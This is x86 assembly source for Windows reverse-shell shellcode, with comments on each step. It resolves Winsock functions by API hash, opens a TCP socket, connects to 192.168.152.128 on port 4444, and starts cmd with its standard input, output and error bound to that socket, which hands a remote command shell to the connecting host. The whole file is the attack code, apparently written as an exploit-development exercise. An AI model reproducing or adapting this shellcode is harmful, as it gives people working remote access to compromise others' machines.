; get functions in ws2_32.dll
;ws2_32.dll  	77 73 32 5f 33 32 2e 64 6c 6c
	xor eax,eax
	push 0xff206c6c			; push ws2_32.dll to stack
	push 0x642e3233
	push 0x5f327377
	mov [esp+0xA],al		; put null byte at end of string
	push esp				; push null terminated string
	push 0xec0e4e8e			; push loadlibraryA hash
	call ebp				; call loadLibraryA(ws2_32.dll)
;WSAStartup(WORD wVersionRequested,struct LPWSADATA lpWSAData)
	xor edx,edx				; zero out eax
	mov dh,0x03				; set edx = 0x00000300 because LPWSDATA needs 300 bytes on stack
	sub esp,edx				; save space on stack
;initialize WSAStatrup socket
	xor ecx,ecx
	inc ecx	
	inc ecx
	push esp				; push the stack space which is gonna be used by function
	push ecx				; wVersionRequested = 2
	push 0x3BFCEDCB			; push WSAStartup hash 
	call ebp				; call it
	add esp,0x0300			; restore stack to original position
;WSASocket(int af,itn type,int protocol, lpprotocolinfo,group g,DWORD dwflags)
;WSASocket(2,1,0,0,0,0)
	xor eax,eax		; zero out eax
	push eax		; dwflags = 0
	push eax		; g = 0
	push eax		; lpprotocolinfo = NULL
	push eax		; protocol = 0
	inc eax			; eax = 1
	push eax		; type = 1 = SOCK_STREAM
	inc eax			; eax = 2
	push eax		; af = 2 = AF_INET
	push 0xADF509D9	; push WSASocketA hash
	call ebp		; call WSASocket
	mov esi,eax		; save socket file discriptor in esi
; put "cmd" on stack
	mov eax,0x646d6301	; mov "cmd01" to eax
	sar eax,0x08		; shift right 8 bits to get NULL at end of cmd
	push eax		; push cmd on stack
	mov ebx,esp	; save pointer to cmd in ebp+0x20	
;Connect(socket s,struct sockaddr *name, namelen)
;Connect(esi,struct *sockaddr_in,lenght)
;initalize struct sockaddr_in
;sockaddr_in{sin_family,sin_port,struct in addr sin_addr,sin_zero}
	xor eax,eax		; zeor out eax
	push eax		; sin_zero = NULL
	push 0x807FA8C0 	; push address in network bytes format for struct in_addr (192.168.152.128)
	mov eax,0x5c110102	; put the port in networkbytes format in eax 4444 = 5c11 the extra 0102 will be decresed to become 0002 the sinfamily since the size is word of sin-family and sin_port
	dec ah			;decresed the 0102 as explained above
	push eax		; push the sin_port and sin_family
	mov eax,esp		; put the pointer to struct on stack to ebx
;struct end
	xor ebx,ebx
	mov bl,0x10		; let eax = 0x10 which 16 decimal - size of struct 
	push ebx		; push value of namelen 0x10
	push eax		; push struct sockaddr_in
	push esi		; push socke file descriptor returned by WSASocketA
	push 0x60AAF9EC	; push connect() hash
	call ebp		; call connect()
; put "cmd" on stack
	mov eax,0x646d6301	; mov "cmd01" to eax
	sar eax,0x08		; shift right 8 bits to get NULL at end of cmd
	push eax		; push cmd on stack
	mov ebx,esp	; save pointer to cmd in ebp+0x20
;CreateProcess(lpapplicationname,lpcommandline,lpprocessattributes,lpthreadattributes,binherithandles,dwcreateionflags,lpcurrentdirectory,struct lpstartupinfo, struct lp process information)
;struct STARTUPINFO{cb,lpreserved,lpdesktop,lptitle,dwx,dwy,dwxsize,dwysize,dwxcountchars,dwycountchars,dwfillattribute,dwflages,wshowwindow,cbreserved2,lpreserved2,hstdInput,hStdOutput,hStdError}
;struct PROCESSINFORMATION{hProcess,hThread,dwProcessId,dwThreadId}
;structs initalization
	xor ecx,ecx	
	mov cl,0x54		; ecx holds the size of both struct STARTUPINFO & PROCESSINFO
	sub esp,ecx		; save sace on stack for structs
	mov edi,esp		; edi holds pointer to struct
	push edi		; save pointer on stack
	xor eax,eax		
	rep stosb		; fill bytes in edi with bytes at eax till ecx = 0 ( fill out out structs with 00
	pop edi			; restore original struct position
; structs initialization end
; struct STARTUPINFO data insertion
	mov byte [edi],0x44		; mov byte 0x44 to address pointed to by edi cb = 0x44
	inc byte [edi+0x2D]		; ; increase byte at edi+0x38 to 1 to set dwFlags attribute to STAT_USESTDHANDLE tp indicate the hStd handles will be use
	push edi				; save STARTUPINFO struct postiion on stack
	mov eax,esi				; move the socket file descriptor to eax
	lea edi,[edi+0x38]		; load address of hstd's arguments into edi
	stosd					; store dword at  eax in address pointed to by edi hStdinput = socket file descriptor
	stosd					; hStdOuptut = socket file descriptor
	stosd					; hStdError = socket file descriptor
	pop edi					; resotre original struct postion
;struct STARTUPINTO end
	lea esi,[edi+0x44]		; load effective address of [edi + 0x44] into esi esi = PROCESSINFO struct
;CreateProcess(lpapplicationname,lpcommandline,lpprocessattributes,lpthreadattributes,binherithandles,dwcreateionflags,lpcurrentdirectory,struct lpstartupinfo, struct lp process information)
	xor eax,eax		; zero out eax 
	push esi		; push the pointer to the PROCESSINFORMATION struct to lpProcessInformation attribute
	push edi		; push the pointer to the STARTUPINFORMATION struct to lpStartupinfo attribute  
	push eax		; set lpstartupdirectory to NULL
	push eax		; set the lpEnviroment to NULL
	;push 0x08000000		; set the dwcreationflag to CREATE_NO_WINDOW
	push eax		; set the dwcreationflag to 0
	inc eax			; eax = 1
	push eax		; set bInheritHandles argument to TRUE since client need to inherit the socket file descriptor
	dec eax			; eax = 0
	push eax		; set lpthreadAttributes argument as NULL
	push eax 		; set lpProcessAttributes argument as NULL
	push ebx		; set the lpcommandline argument to cmd saved at [ebp+0x2c]
	push eax		; set lpApplicationName argument to NULL
	push 0x16B3FE72		; push createProcessA hash
	call ebp 
